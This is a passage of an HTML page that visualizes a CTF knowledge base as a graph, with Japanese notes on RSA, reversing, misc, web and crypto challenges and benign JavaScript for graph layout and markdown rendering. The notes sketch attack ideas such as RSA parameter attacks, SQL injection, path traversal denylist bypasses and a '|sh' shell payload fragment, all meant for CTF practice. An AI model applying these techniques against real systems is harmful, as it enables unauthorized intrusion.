"insights/rsa.md", "rel_path": "insights/rsa.md", "kind": "insights", "title": "RSA", "meta": {}, "links": [], "markdown": "# RSA\n\nRSA 系の問題を見るときは、まず「普通の RSA と何が違うか」を探す。\nCTF では実装やパラメータがわざと壊されていることが多く、鍵長そのものよりも、平文、素数、指数、padding、pow 実装、複数暗号文の関係が攻撃面になる。\n\n## 基本計算\n\n- 通常は `n = p*q`, `phi = (p-1)(q-1)`, `d = e^-1 mod phi`, `m = c^d mod n`。\n- modulus が素数 `p` だけなら `phi = p - 1` で復号できる。\n- `p` と `q` に関係式があるなら、まず `n` をその関係式に代入して factorization できないか見る。\n- `pow(c, d, n)` の結果は常に `m mod n`。元の平文が `n` 以上なら、長さや prefix で `m + k*n` を lift する必要がある。\n\n## 壊れやすい部分\n\n- **padding が deterministic**: 既知部分が大きく未知部分が小さいと Coppersmith/small roots に落ちる。\n- **同じ modulus の再利用**: 異なる指数で同じ平文を暗号化すると common modulus attack が使える。\n- **指数の gcd が 1 でない**: `m` ではなく `m^g` が得られる。未知部分が小さいなら small root に続く。\n- **関連素数**: `q = 2p + 1` などは `n` から二次方程式で復元できる。\n- **指数に線形関係がある**: 複数の `m^e` から指数の一次結合を作り、`m^1` に戻せることがある。\n- **自作 pow**: 乗算と加算、mod の位置、初期値が壊れると、RSA ではなく線形合同や別演算になる。\n\n## 考え方\n\n1. 与えられた値を分類する: `n`, `e`, `c`, `d`, `p`, `q`, 複数 ciphertext, 実装コード。\n2. `n` の構造を見る: 素数1個、関連素数、再利用、サイズ不足。\n3. 平文サイズを見る: `bytes_to_long(flag)` が `n` を超えないか。\n4. padding を見る: ランダムか、既知 prefix/suffix があるか、未知部分が小さいか。\n5. 複数暗号文の関係を見る: 同じ `m`、同じ `n`、指数の gcd、指数更新式。\n6. 実装を読む: `pow` 相当が本当に累乗か、mod inverse の modulus は正しいか。\n\n## 代表的な攻撃の形\n\n- `d` leak: `pow(c, d, n)`。ただし平文が大きい場合は residue lifting。\n- one-prime RSA: `d = inverse(e, p-1)`。\n- related primes: `n = p(2p+1)` などを方程式化。\n- common modulus: `s*e1 + t*e2 = g` から `m^g` を得る。\n- Coppersmith: `m = known + x` で `x` が十分小さいとき小さい根を探す。\n- exponent relation: `c_i = m^{e_i}` の比や冪で、未知指数を消し、同じ base の別冪を得る。\n\n## 実戦メモ\n\n- RSA 問は Sage/Python で式をそのまま試しやすい。まず小さい式に落としてから solver を使う。\n- flag format や長さ制約は攻撃の一部。暗号の外側の制約も必ず使う。\n- 「安全そうな名前」の関数、例えば `my_pow` や `safe_prime` は名前ではなく式で確認する。\n", "y": 3397.1428571428573, "degree": 7, "displayLabel": "rsa"}, {"id": "insights/rev.md", "rel_path": "insights/rev.md", "kind": "insights", "title": "Rev", "meta": {}, "links": [], "markdown": "# Rev\n\nRev は入力がどのように変換され、どこで正解と比較されるかを追う。\n全部を完全に理解するより、比較点・データ定数・可逆変換・外部効果を先に押さえると速い。\n\n## 初動\n\n- `strings`, `file`, `checksec`, `objdump`, Ghidra/IDA で形式と比較関数を見る。\n- `strcmp`, `memcmp`, `strncmp`, `printf`, `puts` の直前を確認する。\n- static data 配列、S-box、key、出力列を探す。\n- 入力長チェックを探す。\n\n## 壊れやすい部分\n\n- **平文比較**: 最後が `strcmp(input, expected)` なら breakpoint で expected を読む。\n- **可逆な1文字変換**: `+ i`, `^ i`, key XOR は出力から戻せる。\n- **関数ポインタ**: 候補関数が少なければ index ごとの呼び分け表にする。\n- **難読化 script**: eval/Invoke-Expression の直前を表示する。\n- **VM**: 命令セットが小さいなら emulator か Z3 で入力を解く。\n- **IR/assembly**: レジスタや SSA を高級言語の変数へ写す。\n\n## 考え方\n\n1. 入力長と flag format を確認する。\n2. 比較点を見つける。比較対象が平文か暗号文かを分ける。\n3. 変換が可逆なら逆変換を書く。\n4. 変換が複雑なら symbolic execution や Z3 へ寄せる。\n5. 時間待ちや anti-debug が本質でなければ、patch/jump/hook で飛ばす。\n\n## 実戦メモ\n\n- 「複雑な処理」より「最後に何と比べるか」が重要。\n- XOR は式を 0 条件から解く。`(input ^ a) ^ b == 0` なら `input = a ^ b`。\n- VM は opcode 表を作った時点で半分解けている。状態が byte 配列なら BitVec(8) がよく合う。\n", "y": 2745.714285714286, "degree": 9, "displayLabel": "rev"}, {"id": "insights/misc.md", "rel_path": "insights/misc.md", "kind": "insights", "title": "Misc", "meta": {}, "links": [], "markdown": "# Misc\n\nMisc はジャンル横断の観察問題が多い。\n暗号・Pwn・Web の定石だけでなく、UI、Cookie、正規表現、shell の短い構文、問題文の含みを拾う。\n\n## 初動\n\n- 配布物、ページ、Cookie、headers、保存状態、metadata を見る。\n- 問題文の単語を素直に受け取る。数字、日付、伝統、静かさ、制限などがヒントになる。\n- 入力制限があるときは、その制限内で使える構文を列挙する。\n\n## 壊れやすい部分\n\n- **oracle**: `Hit/Miss` のような1 bit 応答でも、prefix を伸ばせば secret が漏れる。\n- **regex**: `^prefix`, character class, alternation で探索できる。\n- **short shell payload**: `|sh` のように環境や標準入出力を利用する。\n- **browser state**: Cookie/localStorage に flag や token がある。\n- **calendar/date**: 問題の月・日・曜日がそのまま key になることがある。\n\n## 考え方\n\n1. 「計算する問題」か「観察する問題」かをまず分ける。\n2. 返ってくる情報が少なくても、繰り返し問い合わせられるなら oracle 化する。\n3. 入力制限が短いほど、既存の実行環境に乗る payload を探す。\n4. Web 的な Misc では DevTools と HTTP raw response を見る。\n\n## 実戦メモ\n\n- Easy Misc はソースや本文より Cookie が答え、ということも普通にある。\n- 正規表現 oracle は線形探索でも解けるが、文字クラスで二分探索できることが多い。\n", "y": 1442.857142857143, "degree": 5, "displayLabel": "misc"}, {"id": "insights/web.md", "rel_path": "insights/web.md", "kind": "insights", "title": "Web", "meta": {}, "links": [], "markdown": "# Web\n\nWeb 問は、入力がどの構文・どの状態・どの権限境界に入るかを見る。\nSQL、URL、shell、awk、path、template、Cookie など、見た目は同じ文字列でも、解釈する側が変わると脆弱性の種類も変わる。\n\n## 初動\n\n- ルーティングと API を一覧化する。\n- 入力値が入る先を分類する: DB query, subprocess, file path, URL parser, template, auth/session。\n- 状態を確認する: Cookie, localStorage, sessionStorage, headers, generated file。\n- role や user id を変える: self-transfer, target user, admin name, duplicate request。\n\n## 壊れやすい部分\n\n- **business logic**: 自己送金、負数、二重送信、同時実行、境界金額。\n- **SQLi**: username に制限があっても password 側など別 field から条件を作れる。\n- **path traversal**: denylist は `../`, symlink, `/dev/stdin`, `/proc/self/fd` で迂回されやすい。\n- **command/program injection**: shell でなくても awk/sed/grep などの構文に入れば injection。\n- **SSRF/parser gap**: WAF と実際の URL parser の解釈差を見る。\n- **browser state leak**: Cookie や storage に flag がそのままあることがある。\n\n## 考え方\n\n1. 文字列が最終的に誰に解釈されるかを見る。\n2. denylist より allowlist の有無を見る。denylist なら別名や別構文を探す。\n3. 認証・権限は「ログインできるか」だけでなく「どの user の条件で処理されるか」を見る。\n4. ファイル読みは path だけでなく fd と標準入力も見る。\n5. 出力が HTML に保存されるなら、結果ページ経由で読めるか見る。\n\n## 実戦メモ\n\n- `subprocess.run([...])` は shell injection を避けるだけで、呼び出し先プログラムへの injection は防がない。\n- Web easy/misc では DevTools の Application/Network タブが最短のことがある。\n- 仕様上「ありえない操作」、例えば自分から自分への送金は最初に試す。\n", "y": 4048.5714285714284, "degree": 7, "displayLabel": "web"}, {"id": "insights/crypto.md", "rel_path": "insights/crypto.md", "kind": "insights", "title": "Crypto", "meta": {}, "links": [], "markdown": "# Crypto\n\nRSA 以外の crypto は、まず「何が数学的に保存されているか」を見る。\n文字列が整数、素因数、剰余、XOR、乱数列、置換のどれとして表現されているかを分類すると、戻し方が見えやすい。\n\n## 初動\n\n- encoding を見る: bytes-to-long, hex, base64, prime exponent, ord/chr。\n- 演算を見る: XOR, 加算, 乗算, mod, pow, shuffle, PRNG。\n- 独立な成分に分解できないかを見る: 素因数ごとの指数、文字ごとの変換、ブロックごとの処理。\n- 既知 plaintext や flag format を制約として使う。\n\n## 壊れやすい部分\n\n- **素因数の指数に情報を埋める**: factorization すれば各文字の code point がそのまま出る。\n- **XOR の使い回し**: 同じ key や短い key は既知 prefix で戻せる。\n- **独自 encoding**: 見た目が巨大整数でも、構造が可逆なら暗号ではない。\n- **PRNG/LCG**: 状態更新が線形なら、出力差分や連立方程式で戻せる。\n\n## 考え方\n\n1. 暗号か encoding かを分ける。\n2. 可逆な操作なら逆順に戻す。\n3. 巨大整数なら factorization、剰余、bit length、桁数を確認する。\n4. 乱数が絡む場合は seed/state/update のどれが漏れているかを見る。\n\n## 実戦メモ\n\n- `prod(p_i ** ord(flag[i]))` のような形は、素因数分解がそのまま decode。\n- crypto 問でも、flag format と printable 制約は solver の強い条件になる。\n", "y": 791.4285714285714, "degree": 2, "displayLabel": "crypto"}], "edges": [{"source": "relations/pwn.md", "target": "insights/pwn.md", "sourceKind": "relations", "targetKind": "insights", "sourceY": 2094.285714285714, "targetY": 2094.285714285714, "weight": 0.55}, {"source": "relations/pwn.md", "target": "writeup/alphahack/2025-w49/1205_integer-writer.md", "sourceKind": "relations", "targetKind": "writeup", "sourceY": 2094     <script>
        const data = JSON.parse(document.getElementById('graph-data').textContent);
        const nodes = data.nodes.map(n => (Object.assign({}, n)));
        const edges = data.edges.map(e => (Object.assign({}, e)));

        const canvas = document.getElementById('canvas');
        const w = Math.max(window.innerWidth, 800);
        const h = Math.max(window.innerHeight, 600);
        const svgNS = 'http://www.w3.org/2000/svg';
        const svg = document.createElementNS(svgNS, 'svg');
        svg.setAttribute('width', '100%');
        svg.setAttribute('height', '100%');
        svg.setAttribute('viewBox', `0 0 ${w} ${h}`);
        canvas.appendChild(svg);
        // top-level group; layout is computed once and then fitted into the viewBox.
        const gAll = document.createElementNS(svgNS, 'g');
        svg.appendChild(gAll);

        const nodeById = new Map(nodes.map(n => [n.id, n]));
        const centerX = w / 2;
        const centerY = h / 2;
        nodes.forEach(n => {
            n.x = centerX;
            n.y = centerY;
            n.vx = 0; n.vy = 0;
            // Base radius depending on kind: insights large, writeup small, relations medium
            const base = n.kind === 'insights' ? 14 : (n.kind === 'writeup' ? 6 : 10);
            // Scale with degree (number of edges) but cap to avoid huge nodes
            const scale = Math.sqrt(n.degree || 0) * 3;
            n.r = Math.max(4, Math.min(48, base + scale));
        });

        const edgeEls = edges.map(e => {
            const line = document.createElementNS(svgNS, 'line');
            line.classList.add('edge');
            gAll.appendChild(line);
            return { el: line, data: e };
        });

        const nodeGroup = nodes.map(n => {
            const g = document.createElementNS(svgNS, 'g');
            const c = document.createElementNS(svgNS, 'circle');
            c.setAttribute('r', String(n.r));
            c.setAttribute('fill', n.kind === 'insights' ? '#f97316' : (n.kind === 'relations' ? '#06b6d4' : '#60a5fa'));
            c.classList.add('node-circle');
            g.appendChild(c);
            const label = document.createElementNS(svgNS, 'text');
            label.setAttribute('y', '0');
            label.setAttribute('text-anchor', 'middle');
            label.setAttribute('dominant-baseline', 'middle');
            label.classList.add('node-label');
            label.textContent = n.displayLabel || '';
            g.appendChild(label);
            gAll.appendChild(g);
            return { g, c, label, node: n };
        });

        const tooltip = document.getElementById('tooltip');

        function showTooltip(n, clientX, clientY) {
            const html = [];
            html.push(`<div style="font-weight:800; font-size:14px; margin-bottom:6px">${escapeHtml(n.title || n.id)}</div>`);
            if (n.rel_path) html.push(`<div style="color:#9fb7d8; font-size:12px; margin-bottom:6px">${escapeHtml(n.rel_path)}</div>`);
            const chips = [];
            if (n.meta && n.meta.category) chips.push(n.meta.category);
            if (n.meta && n.meta.genre) chips.push(n.meta.genre);
            if (n.meta && n.meta.difficulty) chips.push(n.meta.difficulty);
            if (n.meta && Array.isArray(n.meta.tags)) chips.push(...n.meta.tags);
            if (chips.length) html.push('<div>' + chips.slice(0,6).map(c=>`<span class="chip">${escapeHtml(c)}</span>`).join('') + '</div>');
            tooltip.innerHTML = html.join('');
            tooltip.style.display = 'block';
            const x = Math.min(window.innerWidth - 380, clientX + 12);
            const y = Math.min(window.innerHeight - 80, clientY + 12);
            tooltip.style.left = x + 'px';
            tooltip.style.top = y + 'px';
        }

        function hideTooltip() { tooltip.style.display = 'none'; }

        function escapeHtml(s){ return String(s).replaceAll('&','&amp;').replaceAll('<','&lt;').replaceAll('>','&gt;'); }
        function fileUrl(path) { return encodeURI(path).replaceAll('#', '%23'); }
        function openNodeFile(node) {
            if (!node || !node.rel_path) return;
            openReader(node);
        }
        function splitFrontmatter(text) {
            if (!text.startsWith('---\n')) return text;
            const end = text.indexOf('\n---\n', 4);
            return end === -1 ? text : text.slice(end + 5);
        }
        function renderInline(text, basePath) {
            return escapeHtml(text)
                .replace(/`([^`]+)`/g, '<code>$1</code>')
                .replace(/\[([^\]]+)\]\(([^)]+)\)/g, (match, label, href) => {
                    const cleanHref = href.split('#', 1)[0];
                    const target = cleanHref.endsWith('.md') ? resolveMarkdownPath(cleanHref, basePath) : '';
                    const attr = target ? ` data-target="${escapeHtml(target)}" href="#"` : ` href="${escapeHtml(href)}" target="_blank" rel="noopener"`;
                    return `<a${attr}>${label}</a>`;
                });
        }
        function resolveMarkdownPath(href, basePath) {
            if (href.includes('://') || href.startsWith('#')) return '';
            const baseParts = (basePath || '').split('/');
            baseParts.pop();
            const path = href.split('#', 1)[0].split('?').shift();
            path.split('/').forEach(part => {
                if (!part || part === '.') return;
                if (part === '..') baseParts.pop();
                else baseParts.push(part);
            });
            return baseParts.join('/');
        }
        function renderMarkdown(markdown, basePath) {
            const lines = splitFrontmatter(markdown || '').replace(/\r\n/g, '\n').split('\n');
            const out = [];
            let paragraph = [];
            let list = null;
            let inCode = false;
            let codeLines = [];

            function flushParagraph() {
                if (!paragraph.length) return;
                out.push(`<p>${renderInline(paragraph.join(' '), basePath)}</p>`);
                paragraph = [];
            }
            function flushList() {
                if (!list) return;
                out.push(`<${list.tag}>${list.items.map(item => `<li>${renderInline(item, basePath)}</li>`).join('')}</${list.tag}>`);
                list = null;
            }

            lines.forEach(line => {
                if (line.startsWith('```')) {
                    if (inCode) {
                        out.push(`<pre><code>${escapeHtml(codeLines.join('\n'))}</code></pre>`);
                        inCode = false;
                        codeLines = [];
                    } else {
                        flushParagraph();
                        flushList();
                        inCode = true;
                    }
                    return;
                }
                if (inCode) {
                    codeLines.push(line);
                    return;
                }
                if (!line.trim()) {
                    flushParagraph();
                    flushList();
                    return;
                }
                const heading = line.match(/^(#{1,3})\s+(.+)$/);
                if (heading) {
                    flushParagraph();
                    flushList();
                    const level = heading[1].length;
                    out.push(`<h${level}>${renderInline(heading[2].trim(), basePath)}</h${level}>`);
                    return;
                }
                const quote = line.match(/^>\s?(.*)$/);
                if (quote) {
                    flushParagraph();
                    flushList();
                    out.push(`<blockquote>${renderInline(quote[1], basePath)}</blockquote>`);
                    return;
                }
                const ordered = line.match(/^\s*\d+\.\s+(.+)$/);
                const unordered = line.match(/^\s*[-*]\s+(.+)$/);
                if (ordered || unordered) {
                    flushParagraph();
                    const tag = ordered ? 'ol' : 'ul';
                    if (!list || list.tag !== tag) flushList();
                    if (!list) list = { tag, items: [] };
                    list.items.push((ordered || unordered)[1]);
                    return;
                }
                paragraph.push(line.trim());
            });
            if (inCode) out.push(`<pre><code>${escapeHtml(codeLines.join('\n'))}</code></pre>`);
            flushParagraph();
            flushList();
            return out.join('\n') || '<p class="reader-empty">No content.</p>';
        }
        function openReader(node) {
            const reader = document.getElementById('reader');
            document.getElementById('reader-heading').textContent = node.title || node.id;
            document.getElementById('reader-path').textContent = node.rel_path || '';
            const body = document.getElementById('reader-body');
            body.innerHTML = renderMarkdown(node.markdown || '', node.rel_path || '');
            body.querySelectorAll('a[data-target]').forEach(link => {
                link.addEventListener('click', event => {
                    event.preventDefault();
                    const target = nodeById.get(link.getAttribute('data-target'));
                    if (target) openReader(target);
                });
            });
            document.body.classList.add('reader-open');
            reader.classList.add('open');
            document.getElementById('sidebar').classList.add('closed');
            fitViewBox();
        }
        function closeReader() {
            document.getElementById('reader').classList.remove('open');
            document.body.classList.remove('reader-open');
            fitViewBox();
        }

        // interaction: drag after the static layout has been calculated.
        let dragging = null;
        let dragStart = null;
        nodeGroup.forEach(({g, c, node}) => {
            c.addEventListener('pointerdown', (e)=>{
                dragging = node;
                dragStart = { x: e.clientX, y: e.clientY };
                c.setPointerCapture(e.pointerId);
            });
            c.addEventListener('pointerup', (e)=>{
                if (dragging===node) {
                    const moved = dragStart ? Math.hypot(e.clientX - dragStart.x, e.clientY - dragStart.y) : 0;
                    dragging = null;
                    dragStart = null;
                    c.releasePointerCapture(e.pointerId);
                    if (moved < 5) openNodeFile(node);
                }
            });
            c.addEventListener('pointerenter', (e)=> showTooltip(node, e.clientX, e.clientY));
            c.addEventListener('pointermove', (e)=> {
                if(dragging===node){
                    const point = svg.createSVGPoint();
                    point.x = e.clientX;
                    point.y = e.clientY;
                    const local = point.matrixTransform(svg.getScreenCTM().inverse());
                    node.x = local.x;
                    node.y = local.y;
                    render();
                }
                showTooltip(node, e.clientX, e.clientY);
            });
            c.addEventListener('pointerleave', hideTooltip);
        });

        function render() {
            edgeEls.forEach(({el, data})=>{
                const s = nodeById.get(data.source);
                const t = nodeById.get(data.target);
                if(!s||!t) return;
                el.setAttribute('x1', s.x); el.setAttribute('y1', s.y);
                el.setAttribute('x2', t.x); el.setAttribute('y2', t.y);
            });

            nodeGroup.forEach(({g, c, label, node})=>{
                g.setAttribute('transform', `translate(${node.x}, ${node.y})`);
                c.setAttribute('r', String(node.r));
                label.textContent = node.displayLabel || '';
            });
        }

        function connectedComponents() {
            const neighbors = new Map(nodes.map(n => [n.id, []]));
            edges.forEach(e => {
                if (!neighbors.has(e.source) || !neighbors.has(e.target)) return;
                neighbors.get(e.source).push(e.target);
                neighbors.get(e.target).push(e.source);
            });

            const seen = new Set();
            const components = [];
            nodes.forEach(start => {
                if (seen.has(start.id)) return;
                const stack = [start.id];
                const component = [];
                seen.add(start.id);
                while (stack.length) {
                    const id = stack.pop();
                    const n = nodeById.get(id);
                    if (n) component.push(n);
                    (neighbors.get(id) || []).forEach(next => {
                        if (!seen.has(next)) {
                            seen.add(next);
                            stack.push(next);
                        }
                    });
                }
                components.push(component);
            });
            return components.sort((a, b) => b.length - a.length);
        }

        function layoutComponent(component) {
            const ids = new Set(component.map(n => n.id));
            const componentEdges = edges.filter(e => ids.has(e.source) && ids.has(e.target));
            const radius = Math.max(80, Math.sqrt(component.length) * 42);
            component.forEach((n, index) => {
                const angle = (Math.PI * 2 * index) / Math.max(1, component.length);
                const degreeBias = n.kind === 'relations' ? 0.35 : (n.kind === 'insights' ? 0.52 : 1);
                n.x = Math.cos(angle) * radius * degreeBias;
                n.y = Math.sin(angle) * radius * degreeBias;
                n.vx = 0;
                n.vy = 0;
            });

            const springLength = Math.max(64, Math.min(130, 260 / Math.sqrt(component.length || 1)));
            for (let step = 0; step < 420; step++) {
                const alpha = 1 - step / 420;
                for (let i = 0; i < component.length; i++) {
                    const a = component[i];
                    for (let j = i + 1; j < component.length; j++) {
                        const b = component[j];
                        let dx = a.x - b.x;
                        let dy = a.y - b.y;
                        let d2 = dx * dx + dy * dy + 16;
                        let d = Math.sqrt(d2);
                        let force = (900 * alpha) / d2;
                        let ux = dx / d;
                        let uy = dy / d;
                        a.vx += ux * force;
                        a.vy += uy * force;
                        b.vx -= ux * force;
                        b.vy -= uy * force;
                    }
                }

                componentEdges.forEach(e => {
                    const s = nodeById.get(e.source);
                    const t = nodeById.get(e.target);
                    if (!s || !t) return;
                    let dx = t.x - s.x;
                    let dy = t.y - s.y;
                    let d = Math.sqrt(dx * dx + dy * dy) || 1;
                    let targetLength = e.sourceKind === 'writeup' || e.targetKind === 'writeup' ? springLength : springLength * 0.75;
                    let force = (d - targetLength) * 0.035 * alpha;
                    let fx = (dx / d) * force;
                    let fy = (dy / d) * force;
                    s.vx += fx;
                    s.vy += fy;
                    t.vx -= fx;
                    t.vy -= fy;
                });

                component.forEach(n => {
                    n.vx += (0 - n.x) * 0.004 * alpha;
                    n.vy += (0 - n.y) * 0.004 * alpha;
                    n.vx *= 0.82;
                    n.vy *= 0.82;
                    n.x += n.vx;
                    n.y += n.vy;
                });
            }
        }

        function boundsFor(component) {
            return component.reduce((box, n) => ({
                minX: Math.min(box.minX, n.x - n.r),
                minY: Math.min(box.minY, n.y - n.r),
                maxX: Math.max(box.maxX, n.x + n.r),
                maxY: Math.max(box.maxY, n.y + n.r),
            }), { minX: Infinity, minY: Infinity, maxX: -Infinity, maxY: -Infinity });
        }

        function packComponents() {
            const components = connectedComponents();
            components.forEach(layoutComponent);

            const boxes = components.map(component => {
                const box = boundsFor(component);
                return {
                    component,
                    width: Math.max(80, box.maxX - box.minX),
                    height: Math.max(80, box.maxY - box.minY),
                    box,
                };
            });

            const gap = 110;
            const columns = Math.max(1, Math.ceil(Math.sqrt(boxes.length)));
            const columnWidths = Array(columns).fill(0);
            boxes.forEach((item, index) => {
                const column = index % columns;
                columnWidths[column] = Math.max(columnWidths[column], item.width);
            });

            const rowHeights = [];
            boxes.forEach((item, index) => {
                const row = Math.floor(index / columns);
                rowHeights[row] = Math.max(rowHeights[row] || 0, item.height);
            });

            const columnX = [];
            let cursorX = 0;
            columnWidths.forEach((width, index) => {
                columnX[index] = cursorX;
                cursorX += width + (index === columnWidths.length - 1 ? 0 : gap);
            });

            const rowY = [];
            let cursorY = 0;
            rowHeights.forEach((height, index) => {
                rowY[index] = cursorY;
                cursorY += height + (index === rowHeights.length - 1 ? 0 : gap);
            });

            boxes.forEach((item, index) => {
                const column = index % columns;
                const row = Math.floor(index / columns);
                const offsetX = columnX[column] + (columnWidths[column] - item.width) / 2 - item.box.minX;
                const offsetY = rowY[row] + (rowHeights[row] - item.height) / 2 - item.box.minY;
                item.component.forEach(n => {
                    n.x += offsetX;
                    n.y += offsetY;
                });
            });
        }

        function fitViewBox() {
            const padding = 90;
            const box = boundsFor(nodes);
            const minX = box.minX - padding;
            const minY = box.minY - padding;
            const width = Math.max(320, box.maxX - box.minX + padding * 2);
            const height = Math.max(240, box.maxY - box.minY + padding * 2);
            svg.setAttribute('viewBox', `${minX} ${minY} ${width} ${height}`);
        }

        packComponents();
        render();
        fitViewBox();
        window.addEventListener('resize', fitViewBox);

        function makeTree(paths) {
            const root = {};
            paths.forEach(path => {
                let current = root;
                path.split('/').forEach((part, index, parts) => {
                    current[part] ||= index === parts.length - 1 ? path : {};
                    current = typeof current[part] === 'string' ? current : current[part];
                });
            });
            return root;
        }

        function renderTreeNode(name, value) {
            if (typeof value === 'string') {
                const link = document.createElement('a');
                link.className = 'tree-file';
                link.href = '#';
                link.textContent = name;
                link.title = value;
                link.addEventListener('click', event => {
                    event.preventDefault();
                    const node = nodeById.get(value);
                    if (node) openReader(node);
                });
                return link;
            }

            const details = document.createElement('details');
            details.open = name === 'insights' || name === 'relations' || name === 'writeup';
            const summary = document.createElement('summary');
            summary.textContent = name;
            details.appendChild(summary);
            const children = document.createElement('div');
            children.className = 'tree-children';
            Object.entries(value)
                .sort(([aName, aValue], [bName, bValue]) => {
                    const aFile = typeof aValue === 'string';
                    const bFile = typeof bValue === 'string';
                    if (aFile !== bFile) return aFile ? 1 : -1;
                    return aName.localeCompare(bName);
                })
                .forEach(([childName, childValue]) => children.appendChild(renderTreeNode(childName, childValue)));
            details.appendChild(children);
            return details;
        }

        const sidebar = document.getElementById('sidebar');
        const tree = document.getElementById('tree');
        const treeData = makeTree(nodes.map(n => n.rel_path).sort());
        Object.entries(treeData).forEach(([name, value]) => tree.appendChild(renderTreeNode(name, value)));
        document.getElementById('sidebar-toggle').addEventListener('click', () => sidebar.classList.toggle('closed'));
        document.getElementById('sidebar-close').addEventListener('click', () => sidebar.classList.add('closed'));
        document.getElementById('reader-close').addEventListener('click', closeReader);
    </script>
</body>
</html>
